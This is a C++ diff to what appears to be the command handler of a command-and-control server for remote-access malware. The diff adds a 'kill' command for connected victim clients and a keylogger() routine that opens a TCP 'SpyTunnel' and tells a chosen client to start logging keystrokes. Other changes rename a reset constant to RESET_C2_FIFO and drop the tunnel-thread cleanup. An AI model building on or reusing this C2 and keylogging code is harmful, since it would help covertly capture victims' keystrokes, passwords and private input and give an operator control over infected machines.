@@ -66,7 +66,9 @@ CommandHandler::CommandHandler(
     std::vector<ClientHandler*>* __p_clients,
     EventLog* __p_event_log,
     std::atomic<bool>* __p_shutdown_flag,
-    int* __p_user_verbosity): p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity) {
+    std::string* __p_ip,
+    uint* __p_port,
+    int* __p_user_verbosity): p_ip_(__p_ip),p_port_(__p_port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity) {
 
     argument_list_.push_back(Argument(INDEX_ARG, ARG_TYPE_INT, "-i", "--index"));
     argument_list_.push_back(Argument(ALL_ARG, ARG_TYPE_SET, "-a", "--all"));
@@ -113,14 +115,16 @@ CommandHandler::CommandHandler(
         {HELP_ARG},
         {INDEX_ARG}
     ));
+    command_map_.emplace("kill", Command(
+        "Kill the selected client. Usage: kill -i <client_index> / kill -a to kill all clients",
+        &CommandHandler::kill,
+        this,
+        {HELP_ARG},
+        {INDEX_ARG, ALL_ARG}
+    ));
 }
 
 CommandHandler::~CommandHandler() {
-    for (auto& thread:spy_tunnels_) {
-        if (thread.joinable()) {
-            thread.join();
-        }
-    }
 }
 
 bool CommandHandler::command_exists(const std::string& __root_cmd) {
@@ -145,7 +149,7 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
         });
 
         if (it == argument_list_.end()) {
-            *p_event_log_ << LOG_MUST << RED << "Unknown argument: " << arg << RESET;
+            *p_event_log_ << LOG_MUST << RED << "Unknown argument: " << arg << RESET_C2_FIFO;
             return -1;
         }
 
@@ -159,7 +163,7 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
 
         if (arg_type != ARG_TYPE_SET) {
             if (i + 1 >= args.size()) {
-                *p_event_log_ << LOG_MUST << RED << "Missing value for argument: " << arg << RESET;
+                *p_event_log_ << LOG_MUST << RED << "Missing value for argument: " << arg << RESET_C2_FIFO;
                 return -1;
             }
 
@@ -170,7 +174,7 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
             });
         
             if (is_next_arg_flag) {
-                *p_event_log_ << LOG_MUST << RED << "Expected value after argument: " << arg << ", but got another argument: " << value << RESET;
+                *p_event_log_ << LOG_MUST << RED << "Expected value after argument: " << arg << ", but got another argument: " << value << RESET_C2_FIFO;
                 return -1;
             }
 
@@ -180,13 +184,13 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
                 } else if (arg_type == ARG_TYPE_STRING) {
                     temp_arg_map[arg_num] = value;
                 } else {
-                    *p_event_log_ << LOG_MUST << RED << "Unknown argument type for argument: " << arg << RESET;
+                    *p_event_log_ << LOG_MUST << RED << "Unknown argument type for argument: " << arg << RESET_C2_FIFO;
                     return -1;
                 }
 
                 i++; // Skip the value since it's already processed
             } catch (const std::exception& e) {
-                *p_event_log_ << LOG_MUST << RED << "Invalid value for argument " << arg << ": " << e.what() << RESET;
+                *p_event_log_ << LOG_MUST << RED << "Invalid value for argument " << arg << ": " << e.what() << RESET_C2_FIFO;
                 return -1;
             }
         } else {
@@ -205,11 +209,11 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
         bool all_found = temp_arg_map.find(ALL_ARG) != temp_arg_map.end();
 
         if (index_found && all_found) {
-            *p_event_log_ << LOG_MUST << RED << "Cannot use both -i and -a arguments at the same time" << RESET;
+            *p_event_log_ << LOG_MUST << RED << "Cannot use both -i and -a arguments at the same time" << RESET_C2_FIFO;
             return -1;
         } 
         if (!index_found && !all_found) {
-            *p_event_log_ << LOG_MUST << RED << "Either -i or -a argument is required" << RESET;
+            *p_event_log_ << LOG_MUST << RED << "Either -i or -a argument is required" << RESET_C2_FIFO;
             return -1;
         }
     }
@@ -231,7 +235,7 @@ int CommandHandler::parse_command(const std::string& __root_cmd) {
     
 
     if (!command_exists(__root_cmd)) {
-        *p_event_log_ << LOG_MUST << RED << "Command not found: " << __root_cmd << ". Type help to see all the available commands" << RESET;
+        *p_event_log_ << LOG_MUST << RED << "Command not found: " << __root_cmd << ". Type help to see all the available commands" << RESET_C2_FIFO;
         return -1;
     }
 
@@ -242,7 +246,7 @@ int CommandHandler::parse_command(const std::string& __root_cmd) {
     }
     int rc = parse_arguments(__root_cmd, args_str);
     if (rc < 0) {
-        *p_event_log_ << LOG_MUST << RED << "Invalid command usage! Type " << __root_cmd << "-h to see the usage" << RESET;
+        *p_event_log_ << LOG_MUST << RED << "Invalid command usage! Type " << __root_cmd << " -h to see the usage" << RESET_C2_FIFO;
         return -1;
     } else if (rc == HELP_ARG) {
         return -1;
@@ -279,7 +283,7 @@ void CommandHandler::send_client(CommandCode __command, uint8_t __port, int __cl
 void CommandHandler::send_client(CommandCode __command) {
     uint16_t packet = __command << 8;
     for (int i=0; i<p_clients_->size(); i++) {
-        if (p_clients_->at(i) != nullptr && ClientHandler::is_client_up(p_clients_->at(i)->socket())) {
+        if (p_clients_->at(i) != nullptr && ClientHandler::is_client_up(p_clients_->at(i)->socket()) == 0) {
             send_packet(packet, i);
         }
     }
@@ -341,6 +345,19 @@ void CommandHandler::kill() {
     }
 }
 
+void CommandHandler::keylogger() {
+    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
+    SpyTunnel* keylogger = new SpyTunnel(
+        p_ip_,
+        p_port_,
+        client_index,
+        p_shutdown_flag_,
+        TCP_BASED
+    );
+    spy_tunnels_.emplace_back(keylogger);
+    send_client(KEYLOGGER, 0, client_index);
+}
+
 void CommandHandler::execute_command(char* __cmd, int __len) {
     int rc = 0;
 
@@ -363,14 +380,4 @@ void CommandHandler::execute_command(char* __cmd, int __len) {
 void CommandHandler::cleanup() {
     cmd_.clear();
     arg_map_.clear();
-}
-
-void CommandHandler::cleanup_tunnels() {
-    spy_tunnels_.erase(
-        std::remove_if(
-            spy_tunnels_.begin(),
-            spy_tunnels_.end(),
-            [](std::thread& t) {return !t.joinable();}), 
-        spy_tunnels_.end()
-    );
 }
